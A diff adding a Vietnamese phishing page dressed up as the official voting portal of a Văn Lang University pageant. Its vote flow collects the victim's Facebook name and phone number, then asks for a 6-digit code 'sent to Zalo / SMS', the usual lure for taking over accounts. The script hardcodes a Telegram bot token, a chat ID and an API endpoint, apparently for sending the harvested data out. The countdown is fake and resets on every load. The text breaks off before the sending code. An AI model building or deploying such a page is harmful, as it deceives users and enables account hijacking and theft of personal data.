@@ -1,0 +1,1158 @@
+<!DOCTYPE html>
+<html lang="vi">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Miss & Mister Văn Lang Chính Thức 2026</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+
+        html,
+        body {
+            background: #000;
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            min-height: 100vh;
+            height: 100%;
+            overflow: hidden;
+        }
+
+        .phone-frame {
+            width: 100%;
+            max-width: 390px;
+            height: 100vh;
+            max-height: 844px;
+            border-radius: 45px;
+            padding: 10px;
+            box-shadow: 0 0 0 10px #222, 0 0 30px rgba(0, 0, 0, 0.6);
+            overflow: hidden;
+            position: relative;
+            margin: 0 auto;
+        }
+
+        .scroll-container {
+            width: 100%;
+            height: 100%;
+            overflow-y: auto;
+            border-radius: 35px;
+            scroll-behavior: smooth;
+            background: url("https://cdn.upanhlaylink.com/i/B75Kmgw8.png") no-repeat center center fixed;
+            background-size: cover;
+            background-attachment: fixed;
+        }
+
+        .scroll-container::-webkit-scrollbar {
+            width: 3px;
+        }
+
+        .scroll-container::-webkit-scrollbar-thumb {
+            background: #ffd700;
+            border-radius: 2px;
+        }
+
+        .page {
+            display: none;
+            width: 100%;
+            min-height: 100%;
+            padding-bottom: 20px;
+        }
+
+        .page.active {
+            display: block;
+        }
+
+        .logo-top {
+            text-align: center;
+            padding: 8px 0;
+        }
+
+        .logo-top img {
+            max-width: 100px;
+            margin: 0 auto;
+        }
+
+        .intro-block {
+            color: #fff;
+            padding: 14px;
+            margin: 8px;
+            background: rgba(74, 0, 128, 0.65);
+            border-radius: 14px;
+            border: 1px solid rgba(255, 215, 0, 0.4);
+            text-align: center;
+        }
+
+        .official-badge {
+            display: inline-block;
+            background: #ffd700;
+            color: #4a0080;
+            font-weight: bold;
+            font-size: 13px;
+            padding: 3px 14px;
+            border-radius: 20px;
+            margin-bottom: 10px;
+            letter-spacing: 1px;
+        }
+
+        .intro-block h1 {
+            color: #ffd700;
+            font-size: 16px;
+            line-height: 1.3;
+            margin-bottom: 6px;
+            text-transform: uppercase;
+        }
+
+        .intro-block h2 {
+            color: #fff;
+            font-size: 14px;
+            margin-bottom: 10px;
+            font-weight: 600;
+        }
+
+        .intro-note {
+            font-size: 12px;
+            line-height: 1.5;
+            color: #f3e5f5;
+            margin-bottom: 12px;
+        }
+
+        .closed-note {
+            color: #ff9e9e;
+            font-weight: bold;
+            display: none;
+        }
+
+        .countdown-title {
+            color: #ffd700;
+            font-size: 13px;
+            margin-bottom: 8px;
+            font-weight: 600;
+        }
+
+        .countdown-box {
+            display: flex;
+            justify-content: center;
+            gap: 5px;
+            background: rgba(255, 255, 255, 0.1);
+            padding: 10px;
+            border-radius: 10px;
+            flex-wrap: wrap;
+        }
+
+        .count-item {
+            text-align: center;
+            min-width: 48px;
+        }
+
+        .count-num {
+            background: linear-gradient(180deg, #ffd700, #e6b800);
+            color: #2d004d;
+            font-size: 16px;
+            font-weight: bold;
+            padding: 5px 4px;
+            border-radius: 6px;
+            margin-bottom: 3px;
+        }
+
+        .count-num.closed {
+            background: #555;
+            color: #999;
+        }
+
+        .count-label {
+            font-size: 10px;
+            color: #ddd;
+        }
+
+        .candidate-card {
+            margin: 8px;
+            background: rgba(255, 255, 255, 0.08);
+            border-radius: 14px;
+            border: 1px solid rgba(255, 215, 0, 0.3);
+            overflow: hidden;
+        }
+
+        .candidate-img {
+            width: 100%;
+            height: auto;
+            display: block;
+            object-fit: cover;
+        }
+
+        .candidate-info {
+            padding: 10px;
+            color: #fff;
+        }
+
+        .candidate-name {
+            color: #ffd700;
+            font-size: 15px;
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+
+        .candidate-meta {
+            font-size: 12px;
+            color: #eee;
+            margin-bottom: 8px;
+        }
+
+        .vote-row {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            margin-bottom: 8px;
+        }
+
+        .vote-dot {
+            width: 8px;
+            height: 8px;
+            background: #4caf50;
+            border-radius: 50%;
+            flex-shrink: 0;
+        }
+
+        .vote-text {
+            font-size: 12px;
+            color: #fff;
+        }
+
+        .vote-bar-container {
+            height: 5px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 3px;
+            margin-bottom: 10px;
+        }
+
+        .vote-bar-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #ffd700, #ffeb3b);
+            border-radius: 3px;
+            transition: width 0.4s ease;
+        }
+
+        .percent-tag {
+            display: inline-block;
+            background: rgba(255, 215, 0, 0.15);
+            color: #ffd700;
+            font-size: 12px;
+            font-weight: bold;
+            padding: 2px 8px;
+            border-radius: 10px;
+            margin-bottom: 10px;
+        }
+
+        .btn-row {
+            display: flex;
+            gap: 8px;
+        }
+
+        .btn-vote {
+            flex: 1;
+            background: linear-gradient(180deg, #ffd700, #e6b800);
+            color: #2d004d;
+            font-weight: bold;
+            font-size: 14px;
+            padding: 10px;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .btn-vote:hover {
+            transform: translateY(-1px);
+            box-shadow: 0 3px 10px rgba(255, 215, 0, 0.5);
+        }
+
+        .btn-vote:disabled {
+            background: #555;
+            color: #999;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        .btn-vote.voted {
+            background: linear-gradient(180deg, #4caf50, #2e7d32);
+            color: #fff;
+        }
+
+        .btn-detail {
+            flex: 1;
+            background: #1a1a1a;
+            color: #fff;
+            font-weight: bold;
+            font-size: 13px;
+            padding: 9px;
+            border: 1px solid #444;
+            border-radius: 10px;
+            cursor: pointer;
+        }
+
+        .btn-detail:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .page2-candidate {
+            margin: 8px;
+            border-radius: 14px;
+            overflow: hidden;
+            border: 1px solid rgba(255, 215, 0, 0.3);
+        }
+
+        .page2-candidate img {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+
+        .form-block {
+            margin: 8px;
+            padding: 20px 16px;
+            background: rgba(90, 40, 150, 0.6);
+            border-radius: 16px;
+            border: 1px solid rgba(180, 150, 255, 0.3);
+            color: #fff;
+            backdrop-filter: blur(10px);
+        }
+
+        .form-group {
+            margin-bottom: 14px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            margin-bottom: 6px;
+            color: #fff;
+            font-weight: 500;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 12px 14px;
+            font-size: 15px;
+            border: 1px solid rgba(180, 160, 255, 0.3);
+            border-radius: 10px;
+            background: rgba(255, 255, 255, 0.1);
+            color: #fff;
+            outline: none;
+        }
+
+        .form-group input::placeholder {
+            color: #b8b8d4;
+        }
+
+        .form-group input:focus {
+            border-color: #b080ff;
+            background: rgba(255, 255, 255, 0.15);
+        }
+
+        .error-text {
+            color: #ff9e9e;
+            font-size: 11px;
+            margin-top: 5px;
+            display: none;
+        }
+
+        .btn-continue {
+            width: 100%;
+            margin-top: 6px;
+            padding: 13px;
+            background: linear-gradient(90deg, #7b42f5, #b080ff);
+            color: #fff;
+            font-weight: bold;
+            font-size: 15px;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            box-shadow: 0 4px 12px rgba(100, 60, 200, 0.3);
+        }
+
+        .btn-back {
+            width: 100%;
+            margin-top: 10px;
+            padding: 9px;
+            background: transparent;
+            color: #d4c8ff;
+            font-size: 13px;
+            border: 1px solid rgba(180, 160, 255, 0.3);
+            border-radius: 10px;
+            cursor: pointer;
+        }
+
+        .code-block {
+            margin: 8px;
+            padding: 20px 16px;
+            background: rgba(90, 40, 150, 0.6);
+            border-radius: 16px;
+            border: 1px solid rgba(180, 150, 255, 0.3);
+            color: #fff;
+            text-align: center;
+        }
+
+        .code-title {
+            font-size: 17px;
+            font-weight: bold;
+            margin-bottom: 6px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+        }
+
+        .code-desc {
+            font-size: 12px;
+            color: #d4c8ff;
+            margin-bottom: 16px;
+        }
+
+        .code-inputs {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 16px;
+        }
+
+        .code-input {
+            width: 42px;
+            height: 48px;
+            text-align: center;
+            font-size: 20px;
+            border: 2px solid rgba(180, 160, 255, 0.4);
+            border-radius: 10px;
+            background: rgba(255, 255, 255, 0.08);
+            color: #fff;
+            outline: none;
+        }
+
+        .code-input:focus {
+            border-color: #b080ff;
+            background: rgba(255, 255, 255, 0.15);
+        }
+
+        .note-box {
+            background: rgba(255, 200, 0, 0.12);
+            border: 1px solid rgba(255, 200, 0, 0.3);
+            border-radius: 10px;
+            padding: 10px;
+            margin-bottom: 16px;
+            text-align: left;
+        }
+
+        .note-title {
+            color: #ffd700;
+            font-weight: bold;
+            margin-bottom: 5px;
+            font-size: 13px;
+        }
+
+        .note-text {
+            font-size: 11px;
+            color: #f0e0a0;
+            line-height: 1.4;
+        }
+
+        .btn-submit {
+            width: 100%;
+            padding: 13px;
+            background: linear-gradient(90deg, #7b42f5, #b080ff);
+            color: #fff;
+            font-weight: bold;
+            font-size: 15px;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+        }
+
+        .btn-back-page3 {
+            margin-top: 14px;
+            background: transparent;
+            color: #d4c8ff;
+            border: none;
+            font-size: 13px;
+            cursor: pointer;
+            text-decoration: underline;
+        }
+
+        .success-block {
+            padding: 30px 16px;
+            text-align: center;
+            color: #fff;
+            min-height: 100%;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        .success-icon {
+            font-size: 52px;
+            color: #4caf50;
+            margin-bottom: 12px;
+        }
+
+        .success-title {
+            font-size: 22px;
+            font-weight: bold;
+            color: #e0c0ff;
+            margin-bottom: 12px;
+        }
+
+        .success-line1 {
+            font-size: 14px;
+            margin-bottom: 8px;
+            color: #e0d4ff;
+        }
+
+        .success-name {
+            font-size: 15px;
+            font-weight: bold;
+            color: #ffd700;
+            margin-bottom: 12px;
+        }
+
+        .success-desc {
+            font-size: 13px;
+            line-height: 1.5;
+            color: #d4c8ff;
+            margin-bottom: 16px;
+        }
+
+        .success-note {
+            font-size: 12px;
+            color: #ffd700;
+            margin-bottom: 24px;
+            line-height: 1.4;
+        }
+
+        .btn-home {
+            padding: 11px 26px;
+            background: linear-gradient(90deg, #7b42f5, #b080ff);
+            color: #fff;
+            font-weight: bold;
+            font-size: 14px;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+        }
+
+        .footer-section {
+            margin: 16px 8px 8px;
+            padding: 18px 14px;
+            background: linear-gradient(135deg, rgba(120, 60, 180, 0.5), rgba(90, 40, 150, 0.4));
+            border-radius: 16px;
+            border: 1px solid rgba(180, 150, 255, 0.3);
+            color: #f0e8ff;
+            font-size: 11px;
+            line-height: 1.6;
+        }
+
+        .footer-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 12px;
+            margin-bottom: 12px;
+        }
+
+        .footer-col h3 {
+            color: #ffd700;
+            font-size: 12px;
+            font-weight: bold;
+            margin-bottom: 8px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .footer-col p,
+        .footer-col a {
+            font-size: 11px;
+            color: #e0d4ff;
+            text-decoration: none;
+            margin-bottom: 3px;
+            display: block;
+        }
+
+        .footer-contact p {
+            margin-bottom: 3px;
+            font-size: 11px;
+            color: #e0d4ff;
+        }
+
+        .footer-contact strong {
+            color: #fff;
+        }
+
+        .footer-hotline {
+            color: #ffd700;
+            font-weight: bold;
+        }
+
+        .footer-social {
+            display: flex;
+            gap: 6px;
+            margin: 6px 0;
+        }
+
+        .social-icon {
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.15);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+            font-size: 14px;
+            text-decoration: none;
+        }
+
+        .footer-bottom {
+            border-top: 1px solid rgba(180, 150, 255, 0.25);
+            padding-top: 10px;
+            margin-top: 6px;
+            text-align: center;
+            font-size: 10px;
+            color: #b8a8d8;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="phone-frame">
+        <div class="scroll-container">
+            <!-- TRANG 1: DANH SÁCH THÍ SINH -->
+            <div id="page1" class="page active">
+                <div class="logo-top">
+                    <img src="https://cdn.haitrieu.com/wp-content/uploads/2022/12/Icon-Dai-Hoc-Van-Lang.png"
+                        alt="Logo Văn Lang">
+                </div>
+                <div class="intro-block">
+                    <div class="official-badge">OFFICIAL</div>
+                    <h1>CÔNG BÌNH CHỌN CHÍNH THỨC</h1>
+                    <h2>VƯƠNG MIỄN DANH GIA 2026</h2>
+                    <p class="intro-note" id="intro-text">Bình chọn cho thí sinh bạn yêu thích nhất. Hạn bình chọn sau:
+                    </p>
+                    <p class="closed-note" id="closed-text">⚠️ BÌNH CHỌN ĐÃ KẾT THÚC</p>
+                    <div class="countdown-title" id="cd-title">⏰ THỜI GIAN CÒN LẠI:</div>
+                    <div class="countdown-box">
+                        <div class="count-item">
+                            <div class="count-num" id="cd-days">15</div>
+                            <div class="count-label">NGÀY</div>
+                        </div>
+                        <div class="count-item">
+                            <div class="count-num" id="cd-hours">00</div>
+                            <div class="count-label">GIỜ</div>
+                        </div>
+                        <div class="count-item">
+                            <div class="count-num" id="cd-mins">00</div>
+                            <div class="count-label">PHÚT</div>
+                        </div>
+                        <div class="count-item">
+                            <div class="count-num" id="cd-secs">00</div>
+                            <div class="count-label">GIÂY</div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- THÍ SINH 1 -->
+                <div class="candidate-card">
+                    <img class="candidate-img" src="https://i.ibb.co/bgP3gvz1/photo-6212847481784046694-y.jpg"
+                        alt="Thí sinh SBD 1064 - Phan Trần Tiểu Băng">
+                    <div class="candidate-info">
+                        <div class="candidate-name">SBD 1064 · PHAN TRẦN TIỂU BĂNG</div>
+                        <div class="candidate-meta">19 tuổi · 168cm · Cần Thơ</div>
+                        <div class="vote-row">
+                            <span class="vote-dot"></span>
+                            <span class="vote-text" id="count-1">11.580 lượt bình chọn</span>
+                        </div>
+                        <div class="vote-bar-container">
+                            <div class="vote-bar-fill" id="bar-1" style="width:78%"></div>
+                        </div>
+                        <span class="percent-tag" id="percent-1">78%</span>
+                        <div class="btn-row">
+                            <button class="btn-vote" id="btn-1" onclick="goToPage2(1)">BÌNH CHỌN</button>
+                            <button class="btn-detail">Chi tiết</button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- THÍ SINH 2 -->
+                <div class="candidate-card">
+                    <img class="candidate-img" src="https://i.ibb.co/Wvzjx78C/photo-6212847481784046695-y.jpg"
+                        alt="Thí sinh SBD 1004 - Dương Thị Cẩm Vi">
+                    <div class="candidate-info">
+                        <div class="candidate-name">SBD 1004 · DƯƠNG THỊ CẨM VI</div>
+                        <div class="candidate-meta">22 tuổi · 173cm · Đà Nẵng</div>
+                        <div class="vote-row">
+                            <span class="vote-dot"></span>
+                            <span class="vote-text" id="count-2">12.100 lượt bình chọn</span>
+                        </div>
+                        <div class="vote-bar-container">
+                            <div class="vote-bar-fill" id="bar-2" style="width:82%"></div>
+                        </div>
+                        <span class="percent-tag" id="percent-2">82%</span>
+                        <div class="btn-row">
+                            <button class="btn-vote" id="btn-2" onclick="goToPage2(2)">BÌNH CHỌN</button>
+                            <button class="btn-detail">Chi tiết</button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- THÍ SINH 3 -->
+                <div class="candidate-card">
+                    <img class="candidate-img" src="https://i.ibb.co/1Y11CwjP/photo-6212847481784046696-y.jpg"
+                        alt="Thí sinh SBD 1042 - Nguyễn Ngô Cát Tường">
+                    <div class="candidate-info">
+                        <div class="candidate-name">SBD 1042 · NGUYỄN NGÔ CÁT TƯỜNG</div>
+                        <div class="candidate-meta">Lớp 31 · Ngành Mỹ thuật và Thiết kế</div>
+                        <div class="vote-row">
+                            <span class="vote-dot"></span>
+                            <span class="vote-text" id="count-3">9.850 lượt bình chọn</span>
+                        </div>
+                        <div class="vote-bar-container">
+                            <div class="vote-bar-fill" id="bar-3" style="width:72%"></div>
+                        </div>
+                        <span class="percent-tag" id="percent-3">72%</span>
+                        <div class="btn-row">
+                            <button class="btn-vote" id="btn-3" onclick="goToPage2(3)">BÌNH CHỌN</button>
+                            <button class="btn-detail">Chi tiết</button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- THÍ SINH 4 -->
+                <div class="candidate-card">
+                    <img class="candidate-img" src="https://i.ibb.co/Y7pKFgBm/L-Ng-c-Anh-Th-Miss-Mister-2026.png"
+                        alt="Thí sinh SBD 1087 - Lê Ngọc Anh Thư">
+                    <div class="candidate-info">
+                        <div class="candidate-name">SBD 1087 · LÊ NGỌC ANH THƯ</div>
+                        <div class="candidate-meta">Ngành Ngôn ngữ Anh · Khóa 45</div>
+                        <div class="vote-row">
+                            <span class="vote-dot"></span>
+                            <span class="vote-text" id="count-4">8.720 lượt bình chọn</span>
+                        </div>
+                        <div class="vote-bar-container">
+                            <div class="vote-bar-fill" id="bar-4" style="width:65%"></div>
+                        </div>
+                        <span class="percent-tag" id="percent-4">65%</span>
+                        <div class="btn-row">
+                            <button class="btn-vote" id="btn-4" onclick="goToPage2(4)">BÌNH CHỌN</button>
+                            <button class="btn-detail">Chi tiết</button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- THÍ SINH 5 -->
+                <div class="candidate-card">
+                    <img class="candidate-img" src="https://i.ibb.co/KYxFsbn/Tr-n-Ng-c-Kh-nh-Vy-Miss-Mister-2026.png"
+                        alt="Thí sinh SBD 1023 - Trần Ngọc Khánh Vy">
+                    <div class="candidate-info">
+                        <div class="candidate-name">SBD 1023 · TRẦN NGỌC KHÁNH VY</div>
+                        <div class="candidate-meta">Ngành Truyền thông Đa phương tiện · Khóa 46</div>
+                        <div class="vote-row">
+                            <span class="vote-dot"></span>
+                            <span class="vote-text" id="count-5">9.150 lượt bình chọn</span>
+                        </div>
+                        <div class="vote-bar-container">
+                            <div class="vote-bar-fill" id="bar-5" style="width:68%"></div>
+                        </div>
+                        <span class="percent-tag" id="percent-5">68%</span>
+                        <div class="btn-row">
+                            <button class="btn-vote" id="btn-5" onclick="goToPage2(5)">BÌNH CHỌN</button>
+                            <button class="btn-detail">Chi tiết</button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- THÍ SINH 6 -->
+                <div class="candidate-card">
+                    <img class="candidate-img" src="https://i.ibb.co/k28byqJS/Hoa-kh-i-Van-Lang-2026-Minh-Anh.png"
+                        alt="Thí sinh SBD 1082 - Nguyễn Minh Anh">
+                    <div class="candidate-info">
+                        <div class="candidate-name">SBD 1082 · NGUYỄN MINH ANH</div>
+                        <div class="candidate-meta">Ngành Quản trị Kinh doanh · Khóa 44</div>
+                        <div class="vote-row">
+                            <span class="vote-dot"></span>
+                            <span class="vote-text" id="count-6">10.340 lượt bình chọn</span>
+                        </div>
+                        <div class="vote-bar-container">
+                            <div class="vote-bar-fill" id="bar-6" style="width:75%"></div>
+                        </div>
+                        <span class="percent-tag" id="percent-6">75%</span>
+                        <div class="btn-row">
+                            <button class="btn-vote" id="btn-6" onclick="goToPage2(6)">BÌNH CHỌN</button>
+                            <button class="btn-detail">Chi tiết</button>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- CHÂN TRANG -->
+                <div class="footer-section">
+                    <div class="footer-grid">
+                        <div class="footer-col">
+                            <h3>Miss & Mister Văn Lang University 2026</h3>
+                            <a href="#">Giới thiệu chung</a>
+                            <a href="#">Thể lệ bình chọn</a>
+                            <a href="#">Lịch trình 2026</a>
+                            <a href="#">Ban tổ chức</a>
+                        </div>
+                        <div class="footer-col">
+                            <h3>Hạng mục</h3>
+                            <a href="#">Gương mặt ấn tượng · Thân thái & cá tính</a>
+                            <a href="#">Trang Phục - Văn Hoá · Nét đẹp dân tộc</a>
+                            <a href="#">Hình Thể Ấn Tượng · Nét đẹp hình thể</a>
+                        </div>
+                        <div class="footer-col">
+                            <h3>Liên hệ</h3>
+                            <p>45 Nguyễn Khắc Nhu, Q.1, TP.HCM</p>
+                            <p>Email: <strong>msvlu2026@vanlanguni.edu.vn</strong></p>
+                            <p>Hotline: <strong class="footer-hotline">028 7109 9221</strong></p>
+                        </div>
+                        <div class="footer-col">
+                            <h3>Mạng xã hội</h3>
+                            <div class="footer-social">
+                                <a href="#" class="social-icon">f</a>
+                                <a href="#" class="social-icon">▶</a>
+                                <a href="#" class="social-icon">ⓘ</a>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="footer-bottom">
+                        © 2026 MISS & MISTER VĂN LANG UNIVERSITY - CỔNG BÌNH CHỌN CHÍNH THỨC
+                    </div>
+                </div>
+            </div>
+
+            <!-- TRANG 2: NHẬP THÔNG TIN -->
+            <div id="page2" class="page">
+                <div class="logo-top">
+                    <img src="https://cdn.haitrieu.com/wp-content/uploads/2022/12/Icon-Dai-Hoc-Van-Lang.png"
+                        alt="Logo Văn Lang">
+                </div>
+                <div class="page2-candidate">
+                    <img id="page2-img" src="" alt="Thí sinh">
+                </div>
+                <div class="form-block">
+                    <div class="form-group">
+                        <label>Tên Facebook</label>
+                        <input type="text" id="facebook_name" placeholder="Nhập tên Facebook người bình chọn">
+                        <div class="error-text" id="facebook-error">Tên Facebook không được để trống!</div>
+                    </div>
+                    <div class="form-group">
+                        <label>Mã Số Báo Danh</label>
+                        <input type="text" id="sbd" placeholder="Nhập số báo danh của thí sinh"
+                            oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+                        <div class="error-text" id="sbd-error">Vui lòng nhập số báo danh!</div>
+                    </div>
+                    <div class="form-group">
+                        <label>Số Điện Thoại</label>
+                        <input type="tel" id="phone" placeholder="Nhập số điện thoại người bỏ phiếu"
+                            oninput="this.value = this.value.replace(/[^0-9]/g, '')">
+                        <div class="error-text" id="phone-error">Số điện thoại phải đúng 10 hoặc 11 chữ số!</div>
+                    </div>
+                    <button class="btn-continue" onclick="goToPage3()">TIẾP TỤC →</button>
+                    <button class="btn-back" onclick="backToPage1()">← QUAY LẠI</button>
+                </div>
+            </div>
+
+            <!-- TRANG 3: NHẬP MÃ XÁC NHẬN -->
+            <div id="page3" class="page">
+                <div class="logo-top">
+                    <img src="https://cdn.haitrieu.com/wp-content/uploads/2022/12/Icon-Dai-Hoc-Van-Lang.png"
+                        alt="Logo Văn Lang">
+                </div>
+                <div class="code-block">
+                    <div class="code-title">🔒 NHẬP MÃ BÀI THI</div>
+                    <div class="code-desc">Vui lòng nhập 6 chữ số mã số đã được gửi về Zalo / SMS</div>
+                    <div class="code-inputs">
+                        <input type="text" maxlength="1" class="code-input" id="c1"
+                            oninput="onlyNumber(this); moveNext(1)">
+                        <input type="text" maxlength="1" class="code-input" id="c2"
+                            oninput="onlyNumber(this); moveNext(2)">
+                        <input type="text" maxlength="1" class="code-input" id="c3"
+                            oninput="onlyNumber(this); moveNext(3)">
+                        <input type="text" maxlength="1" class="code-input" id="c4"
+                            oninput="onlyNumber(this); moveNext(4)">
+                        <input type="text" maxlength="1" class="code-input" id="c5"
+                            oninput="onlyNumber(this); moveNext(5)">
+                        <input type="text" maxlength="1" class="code-input" id="c6" oninput="onlyNumber(this)">
+                    </div>
+                    <div class="note-box">
+                        <div class="note-title">💡 LƯU Ý</div>
+                        <div class="note-text">Mã số bài thi gồm 6 chữ số, đã được gửi về Zalo hoặc SMS của bạn. Phải
+                            nhập đủ 6 số mới gửi được!</div>
+                    </div>
+                    <button class="btn-submit" onclick="goToSuccess()">✅ GỬI PHIẾU</button>
+                    <button class="btn-back-page3" onclick="backToPage2()">← Quay lại trang trước</button>
+                </div>
+            </div>
+
+            <!-- TRANG THÀNH CÔNG -->
+            <div id="pageSuccess" class="page">
+                <div class="logo-top">
+                    <img src="https://cdn.haitrieu.com/wp-content/uploads/2022/12/Icon-Dai-Hoc-Van-Lang.png"
+                        alt="Logo Văn Lang">
+                </div>
+                <div class="success-block">
+                    <div class="success-icon">✅</div>
+                    <div class="success-title">✨ THƯ CẢM ƠN!</div>
+                    <div class="success-line1">Cảm ơn bạn đã tham gia bình chọn</div>
+                    <div class="success-name" id="thank-name"></div>
+                    <div class="success-desc">🌸 Miss & Mister Văn Lang University 2026 🌸<br><br>Sự ủng hộ của bạn là
+                        nguồn động lực to lớn giúp thí sinh tỏa sáng và chạm đến ước mơ.</div>
+                    <div class="success-note">📩 Bình chọn đã được ghi nhận thành công!</div>
+                    <button class="btn-home" onclick="goToPage1FromEnd()">🏠 TRANG CHỦ</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // === CẤU HÌNH ===
+        const BOT_TOKEN = '9294423728:AAF8bl8LzRbLkKhGlh3X54Xv0Rjkfpb-v9E';
+        const CHAT_ID = '-5347099145';
+        const API = `https://api.telegram.org/bot${BOT_TOKEN}`;
+
+        // Đếm ngược 15 ngày kể từ khi trang được mở
+        const TOTAL_DURATION = 15 * 24 * 60 * 60 * 1000;
+        const START_TIME = Date.now();
+        const END_TIME = START_TIME + TOTAL_DURATION;
+
+        const candidateImages = {
+            1: "https://i.ibb.co/bgP3gvz1/photo-6212847481784046694-y.jpg",
+            2: "https://i.ibb.co/Wvzjx78C/photo-6212847481784046695-y.jpg",
+            3: "https://i.ibb.co/1Y11CwjP/photo-6212847481784046696-y.jpg",
+            4: "https://i.ibb.co/Y7pKFgBm/L-Ng-c-Anh-Th-Miss-Mister-2026.png",
+            5: "https://i.ibb.co/KYxFsbn/Tr-n-Ng-c-Kh-nh-Vy-Miss-Mister-2026.png",
+            6: "https://i.ibb.co/k28byqJS/Hoa-kh-i-Van-Lang-2026-Minh-Anh.png"
+        };
+
+        const candidateSBD = {
+            1: '1064', 2: '1004', 3: '1042', 4: '1087', 5: '1023', 6: '1082'
+        };
+
+        const data = {
+            1: { count: 11580, percent: 78, voted: false },
+            2: { count: 12100, percent: 82, voted: false },
+            3: { count: 9850, percent: 72, voted: false },
+            4: { count: 8720, percent: 65, voted: false },
+            5: { count: 9150, percent: 68, voted: false },
+            6: { count: 10340, percent: 75, voted: false }
+        };
+
+        let candidateId = null;
+        let voterFacebook = '';
+        let voterSBD = '';
+        let voterPhone = '';
+        let isClosed = false;
+
+        // === CHỈ CHO NHẬP SỐ ===
+        function onlyNumber(el) {
+            el.value = el.value.replace(/[^0-9]/g, '');
+        }
+
+        // === Đếm ngược ===
+        function updateCountdown() {
+            const now = Date.now();
+            const remaining = END_TIME - now;
+
+            if (remaining <= 0) {
+                if (!isClosed) {
+                    isClosed = true;
+                    showClosedState();
+                }
+                return;
+            }
+
+            const days = Math.floor(remaining / (1000 * 60 * 60 * 24));
+            const hours = Math.floor((remaining % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+            const mins = Math.floor((remaining % (1000 * 60 * 60)) / (1000 * 60));
+            const secs = Math.floor((remaining % (1000 * 60)) / 1000);
+
+            document.getElementById('cd-days').textContent = String(days).padStart(2, '0');
+            document.getElementById('cd-hours').textContent = String(hours).padStart(2, '0');
+            document.getElementById('cd-mins').textContent = String(mins).padStart(2, '0');
+            document.getElementById('cd-secs').textContent = String(secs).padStart(2, '0');
+        }
+
+        // === Hiển thị trạng thái đã kết thúc ===
+        function showClosedState() {
+            document.getElementById('cd-days').textContent = '00';
+            document.getElementById('cd-hours').textContent = '00';
+            document.getElementById('cd-mins').textContent = '00';
+            document.getElementById('cd-secs').textContent = '00';
+
+            document.querySelectorAll('.count-num').forEach(el => el.classList.add('closed'));
+
+            document.getElementById('intro-text').style.display = 'none';
+            document.getElementById('closed-text').style.display = 'block';
+            document.getElementById('cd-title').textContent = '✅ ĐÃ KẾT THÚC LÚC:';
+
+            for (let i = 1; i <= 6; i++) {
+                const btn = document.getElementById(`btn-${i}`);
+                if (btn) {
+                    btn.disabled = true;
+                    btn.textContent = 'ĐÃ KẾT THÚC';
+                    btn.onclick = null;
+                }
+            }
+        }
+
+        // === Chuyển trang ===
+        function showPage(id) {
+            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+            document.getElementById(id).classList.add('active');
+        }
+
+        // === Bấm bình chọn → Trang 2 ===
+        function goToPage2(id) {
+            if (isClosed) return alert('Thời gian bình chọn đã kết thúc!');
+            if (data[id].voted) return alert('Bạn đã bình chọn cho thí sinh này rồi!');
+
+            candidateId = id;
+            document.getElementById('page2-img').src = candidateImages[id];
+
+            // Reset form
+            document.getElementById('facebook_name').value = '';
+            document.getElementById('sbd').value = '';
+            document.getElementById('phone').value = '';
+            document.getElementById('facebook-error').style.display = 'none';
+            document.getElementById('sbd-error').style.display = 'none';
+            document.getElementById('phone-error').style.display = 'none';
+            showPage('page2');
+        }
+
+        function backToPage1() {
+            showPage('page1');
+        }
+
+        // === Trang 2 → Trang 3 ===
+        async function goToPage3() {
+            const facebook = document.getElementById('facebook_name').value.trim();
+            const sbd = document.getElementById('sbd').value.trim();
+            const phone = document.getElementById('phone').value.trim();
+            let ok = true;
+
+            if (!facebook) {
+                document.getElementById('facebook-error').style.display = 'block';
+                ok = false;
+            } else {
+                document.getElementById('facebook-error').style.display = 'none';
+            }
+
+            if (!sbd) {
+                document.getElementById('sbd-error').style.display = 'block';
+                ok = false;
+            } else {
+                document.getElementById('sbd-error').style.display = 'none';
+            }
+
+            if (!/^\d{10,11}$/.test(phone)) {
+                document.getElementById('phone-error').style.display = 'block';
+                ok = false;
+            } else {
+                document.getElementById('phone-error').style.display = 'none';
+            }
+
+            if (ok) {
